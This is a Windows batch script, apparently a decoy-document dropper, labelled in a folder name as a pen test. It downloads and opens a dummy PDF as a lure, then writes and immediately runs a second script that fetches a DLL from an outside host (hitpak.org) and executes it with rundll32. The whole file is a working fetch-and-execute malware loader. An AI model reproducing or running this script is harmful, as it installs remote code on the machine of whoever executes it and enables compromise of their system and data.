@echo off
setlocal

:: Create PDF target folder and download PDF
set "target=%TEMP%\MyPenTest"
set "pdfurl=https://raw.githubusercontent.com/bhekinko/test/main/dummy.pdf"
set "pdflocal=%target%\dummy.pdf"

mkdir "%target%" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri '%pdfurl%' -OutFile '%pdflocal%'"
start "" "%pdflocal%"

:: ===== ADDITIONAL CODE STARTS HERE =====

:: Set paths
set "updatebat=%TEMP%\update.bat"
set "dllurl=https://hitpak.org/notepad2.dll"
set "dllpath=%TEMP%\notepad2.dll"

:: Create update.bat with hardcoded values
(
echo @echo off
echo powershell -Command "Invoke-WebRequest -Uri 'https://hitpak.org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10 ^>nul
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
) > "%updatebat%"

:: Run update.bat immediately
start "" cmd.exe /c "call \"%updatebat%\""

endlocal
